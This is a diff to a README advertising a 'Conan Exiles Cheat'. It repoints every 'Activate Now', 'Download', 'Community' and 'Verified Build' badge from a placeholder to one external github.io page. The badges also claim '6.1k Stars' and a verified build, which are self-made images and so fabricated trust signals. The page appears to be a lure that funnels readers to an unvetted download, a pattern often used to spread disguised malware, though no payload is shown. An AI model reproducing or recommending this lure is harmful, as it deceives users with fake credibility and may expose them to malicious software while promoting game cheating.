@@ -30,10 +30,10 @@ The **Conan Exiles Cheat** is built for players who want to master the Exiled La
 
   * Save profiles for PvE farming, base building, or combat training.
 
-[![Activate Now](https://img.shields.io/badge/Activate-Now-red?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐ 6.1k Stars](https://img.shields.io/badge/⭐-6.1k_Stars-green?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-orange?style=for-the-badge\&logo=mega)](#)
+[![Activate Now](https://img.shields.io/badge/Activate-Now-red?style=for-the-badge\&logo=rocket)](https://conan-exiles-cheat.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://conan-exiles-cheat.github.io/.github/)
+[![⭐ 6.1k Stars](https://img.shields.io/badge/⭐-6.1k_Stars-green?style=for-the-badge\&logo=github)](https://conan-exiles-cheat.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-orange?style=for-the-badge\&logo=mega)](https://conan-exiles-cheat.github.io/.github/)
 
 ---
 
@@ -110,9 +110,9 @@ A: After every major Conan Exiles patch or expansion.
 
 The **Conan Exiles Cheat** is the ultimate toolkit for reshaping survival into strategy. Whether you want instant building, smooth farming, or unstoppable combat, it’s all here—ready to bend the Exiled Lands to your will.
 
-[![Community](https://img.shields.io/badge/Community-Join-purple?style=for-the-badge\&logo=discord)](#)
-[![Verified Build](https://img.shields.io/badge/Verified-Build-green?style=for-the-badge\&logo=checkmarx)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-orange?style=for-the-badge\&logo=mega)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
+[![Community](https://img.shields.io/badge/Community-Join-purple?style=for-the-badge\&logo=discord)](https://conan-exiles-cheat.github.io/.github/)
+[![Verified Build](https://img.shields.io/badge/Verified-Build-green?style=for-the-badge\&logo=checkmarx)](https://conan-exiles-cheat.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-orange?style=for-the-badge\&logo=mega)](https://conan-exiles-cheat.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://conan-exiles-cheat.github.io/.github/)
 
 ---
